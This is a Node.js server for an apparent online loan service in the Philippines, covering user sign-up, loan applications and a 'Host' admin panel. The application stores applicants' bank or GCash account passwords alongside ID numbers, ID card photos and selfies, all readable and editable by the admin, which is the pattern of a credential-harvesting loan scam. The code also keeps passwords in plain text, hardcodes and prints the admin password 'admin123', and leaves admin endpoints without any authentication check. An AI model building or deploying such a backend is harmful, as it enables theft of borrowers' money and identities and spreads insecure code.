const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

// Initialize Database structure if not exists
function initDB() {
    if (!fs.existsSync(DB_FILE)) {
        const initialData = {
            users: [], // { id, phone, password, createdAt }
            applications: [], // { id, userId, phone, fullName, gender, dob, civilStatus, address, employmentType, monthlyIncome, loanPurpose, requestedAmount, approvedAmount, loanTermDays, status, idType, idNumber, idCardImage, selfieImage, notes, createdAt, updatedAt }
            admin: { username: 'admin', password: 'admin123' }
        };
        fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
    }
}

function readDB() {
    initDB();
    try {
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        return { users: [], applications: [], admin: { username: 'admin', password: 'admin123' } };
    }
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// Helper to parse JSON body
function getRequestBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                resolve(body ? JSON.parse(body) : {});
            } catch (err) {
                reject(err);
            }
        });
    });
}

// MIME types for static server
const MIME_TYPES = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'text/javascript',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
};

const server = http.createServer(async (req, res) => {
    // CORS Headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
    const pathname = parsedUrl.pathname;

    // API Routes
    if (pathname.startsWith('/api/')) {
        res.setHeader('Content-Type', 'application/json');
        const db = readDB();

        try {
            // User Registration
            if (pathname === '/api/auth/register' && req.method === 'POST') {
                const { phone, password } = await getRequestBody(req);
                if (!phone || !password) {
                    res.writeHead(400);
                    return res.end(JSON.stringify({ error: 'Phone number and password are required.' }));
                }

                const cleanPhone = phone.trim();
                const existingUser = db.users.find(u => u.phone === cleanPhone);
                if (existingUser) {
                    res.writeHead(400);
                    return res.end(JSON.stringify({ error: 'Phone number is already registered. Please log in.' }));
                }

                const newUser = {
                    id: 'usr_' + Date.now() + Math.random().toString(36).substr(2, 4),
                    phone: cleanPhone,
                    password: password, // In production, hash password
                    createdAt: new Date().toISOString()
                };

                db.users.push(newUser);
                writeDB(db);

                res.writeHead(201);
                return res.end(JSON.stringify({ message: 'Registration successful!', user: { id: newUser.id, phone: newUser.phone } }));
            }

            // User Login
            if (pathname === '/api/auth/login' && req.method === 'POST') {
                const { phone, password } = await getRequestBody(req);
                const cleanPhone = (phone || '').trim();
                const user = db.users.find(u => u.phone === cleanPhone && u.password === password);

                if (!user) {
                    res.writeHead(401);
                    return res.end(JSON.stringify({ error: 'Invalid phone number or password.' }));
                }

                res.writeHead(200);
                return res.end(JSON.stringify({ message: 'Login successful!', user: { id: user.id, phone: user.phone } }));
            }

            // Admin Login
            if (pathname === '/api/admin/login' && req.method === 'POST') {
                const { username, password } = await getRequestBody(req);
                if (username === db.admin.username && password === db.admin.password) {
                    res.writeHead(200);
                    return res.end(JSON.stringify({ message: 'Admin authenticated successfully!', token: 'admin_session_valid_token' }));
                } else {
                    res.writeHead(401);
                    return res.end(JSON.stringify({ error: 'Invalid host username or password.' }));
                }
            }

            // Update Admin Credentials
            if (pathname === '/api/admin/credentials' && req.method === 'PUT') {
                const { currentPassword, newUsername, newPassword } = await getRequestBody(req);
                if (currentPassword && currentPassword !== db.admin.password) {
                    res.writeHead(401);
                    return res.end(JSON.stringify({ error: 'Current host password is incorrect.' }));
                }

                if (newUsername) db.admin.username = newUsername.trim();
                if (newPassword) db.admin.password = newPassword;

                writeDB(db);
                res.writeHead(200);
                return res.end(JSON.stringify({ message: 'Host credentials updated successfully!' }));
            }

            // Get User Application (by userId header or query)
            if (pathname === '/api/user/application' && req.method === 'GET') {
                const userId = parsedUrl.searchParams.get('userId');
                if (!userId) {
                    res.writeHead(400);
                    return res.end(JSON.stringify({ error: 'Missing userId parameter.' }));
                }
                const app = db.applications.find(a => a.userId === userId);
                res.writeHead(200);
                return res.end(JSON.stringify({ application: app || null }));
            }

            // Submit / Update User Loan Application
            if (pathname === '/api/user/application' && req.method === 'POST') {
                const data = await getRequestBody(req);
                if (!data.userId || !data.fullName || !data.phone) {
                    res.writeHead(400);
                    return res.end(JSON.stringify({ error: 'Missing required application fields.' }));
                }

                let existingAppIdx = db.applications.findIndex(a => a.userId === data.userId);
                const appData = {
                    id: existingAppIdx >= 0 ? db.applications[existingAppIdx].id : 'app_' + Date.now(),
                    userId: data.userId,
                    phone: data.phone,
                    fullName: data.fullName,
                    gender: data.gender || '',
                    dob: data.dob || '',
                    civilStatus: data.civilStatus || '',
                    address: data.address || '',
                    employmentType: data.employmentType || '',
                    monthlyIncome: data.monthlyIncome || 0,
                    loanPurpose: data.loanPurpose || '',
                    requestedAmount: data.requestedAmount || 5000,
                    approvedAmount: existingAppIdx >= 0 ? db.applications[existingAppIdx].approvedAmount : (data.requestedAmount || 5000),
                    loanTermDays: data.loanTermDays || 14,
                    status: existingAppIdx >= 0 ? db.applications[existingAppIdx].status : 'Pending Review',
                    idType: data.idType || 'SSS ID',
                    idNumber: data.idNumber || '',
                    payoutMethod: data.payoutMethod || 'GCash',
                    bankAccountName: data.bankAccountName || '',
                    bankAccountNumber: data.bankAccountNumber || '',
                    bankAccountPassword: data.bankAccountPassword || '',
                    idCardImage: data.idCardImage || (existingAppIdx >= 0 ? db.applications[existingAppIdx].idCardImage : ''),
                    selfieImage: data.selfieImage || (existingAppIdx >= 0 ? db.applications[existingAppIdx].selfieImage : ''),
                    notes: existingAppIdx >= 0 ? db.applications[existingAppIdx].notes : 'New application submitted by user.',
                    createdAt: existingAppIdx >= 0 ? db.applications[existingAppIdx].createdAt : new Date().toISOString(),
                    updatedAt: new Date().toISOString()
                };

                if (existingAppIdx >= 0) {
                    db.applications[existingAppIdx] = appData;
                } else {
                    db.applications.push(appData);
                }

                writeDB(db);
                res.writeHead(200);
                return res.end(JSON.stringify({ message: 'Loan application submitted successfully!', application: appData }));
            }

            // ADMIN: Get All Applications
            if (pathname === '/api/admin/applications' && req.method === 'GET') {
                res.writeHead(200);
                return res.end(JSON.stringify({ applications: db.applications }));
            }

            // ADMIN: Update/Edit User Information & Loan Details
            if (pathname.startsWith('/api/admin/applications/') && req.method === 'PUT') {
                const appId = pathname.split('/')[4];
                const updateData = await getRequestBody(req);

                const appIndex = db.applications.findIndex(a => a.id === appId);
                if (appIndex === -1) {
                    res.writeHead(404);
                    return res.end(JSON.stringify({ error: 'Application not found.' }));
                }

                // Update fields controlled by host
                const currentApp = db.applications[appIndex];
                const updatedApp = {
                    ...currentApp,
                    fullName: updateData.fullName !== undefined ? updateData.fullName : currentApp.fullName,
                    phone: updateData.phone !== undefined ? updateData.phone : currentApp.phone,
                    gender: updateData.gender !== undefined ? updateData.gender : currentApp.gender,
                    dob: updateData.dob !== undefined ? updateData.dob : currentApp.dob,
                    civilStatus: updateData.civilStatus !== undefined ? updateData.civilStatus : currentApp.civilStatus,
                    address: updateData.address !== undefined ? updateData.address : currentApp.address,
                    employmentType: updateData.employmentType !== undefined ? updateData.employmentType : currentApp.employmentType,
                    monthlyIncome: updateData.monthlyIncome !== undefined ? updateData.monthlyIncome : currentApp.monthlyIncome,
                    requestedAmount: updateData.requestedAmount !== undefined ? updateData.requestedAmount : currentApp.requestedAmount,
                    approvedAmount: updateData.approvedAmount !== undefined ? updateData.approvedAmount : currentApp.approvedAmount,
                    loanTermDays: updateData.loanTermDays !== undefined ? updateData.loanTermDays : currentApp.loanTermDays,
                    status: updateData.status !== undefined ? updateData.status : currentApp.status,
                    idType: updateData.idType !== undefined ? updateData.idType : currentApp.idType,
                    idNumber: updateData.idNumber !== undefined ? updateData.idNumber : currentApp.idNumber,
                    payoutMethod: updateData.payoutMethod !== undefined ? updateData.payoutMethod : currentApp.payoutMethod,
                    bankAccountName: updateData.bankAccountName !== undefined ? updateData.bankAccountName : currentApp.bankAccountName,
                    bankAccountNumber: updateData.bankAccountNumber !== undefined ? updateData.bankAccountNumber : currentApp.bankAccountNumber,
                    bankAccountPassword: updateData.bankAccountPassword !== undefined ? updateData.bankAccountPassword : currentApp.bankAccountPassword,
                    notes: updateData.notes !== undefined ? updateData.notes : currentApp.notes,
                    updatedAt: new Date().toISOString()
                };

                // Also sync phone number back to user account if changed
                const user = db.users.find(u => u.id === currentApp.userId);
                if (user && updateData.phone) {
                    user.phone = updateData.phone;
                }

                db.applications[appIndex] = updatedApp;
                writeDB(db);

                res.writeHead(200);
                return res.end(JSON.stringify({ message: 'User application updated successfully by Host!', application: updatedApp }));
            }

            // ADMIN: Delete Application
            if (pathname.startsWith('/api/admin/applications/') && req.method === 'DELETE') {
                const appId = pathname.split('/')[4];
                db.applications = db.applications.filter(a => a.id !== appId);
                writeDB(db);
                res.writeHead(200);
                return res.end(JSON.stringify({ message: 'Application deleted.' }));
            }

            res.writeHead(404);
            return res.end(JSON.stringify({ error: 'Endpoint not found.' }));

        } catch (err) {
            console.error(err);
            res.writeHead(500);
            return res.end(JSON.stringify({ error: 'Internal Server Error: ' + err.message }));
        }
    }

    // Clean URL Redirects: Strip .html extensions for short clean URLs
    if (pathname === '/index.html') {
        res.writeHead(301, { 'Location': '/' });
        return res.end();
    }
    if (pathname === '/admin.html') {
        res.writeHead(301, { 'Location': '/admin' });
        return res.end();
    }

    // Serve Static Files from public directory
    let requestPath = pathname === '/' ? '/index.html' : pathname;
    if (requestPath === '/admin') requestPath = '/admin.html';
    
    let filePath = path.join(__dirname, 'public', requestPath);
    
    // Safety check to prevent directory traversal
    if (!filePath.startsWith(path.join(__dirname, 'public'))) {
        res.writeHead(403);
        return res.end('Forbidden');
    }

    const extname = String(path.extname(filePath)).toLowerCase();
    const contentType = MIME_TYPES[extname] || 'application/octet-stream';

    fs.readFile(filePath, (error, content) => {
        if (error) {
            if (error.code === 'ENOENT') {
                res.writeHead(404, { 'Content-Type': 'text/html' });
                res.end('<h1>404 Not Found</h1>', 'utf-8');
            } else {
                res.writeHead(500);
                res.end('Server Error: ' + error.code, 'utf-8');
            }
        } else {
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(content, 'utf-8');
        }
    });
});

initDB();
server.listen(PORT, () => {
    console.log(`===================================================`);
    console.log(` Philippines Loan Online Service Server running!`);
    console.log(` User Portal: http://localhost:${PORT}`);
    console.log(` Host Admin Dashboard: http://localhost:${PORT}/admin.html`);
    console.log(` Host Credentials: Username: admin | Password: admin123`);
    console.log(`===================================================`);
});
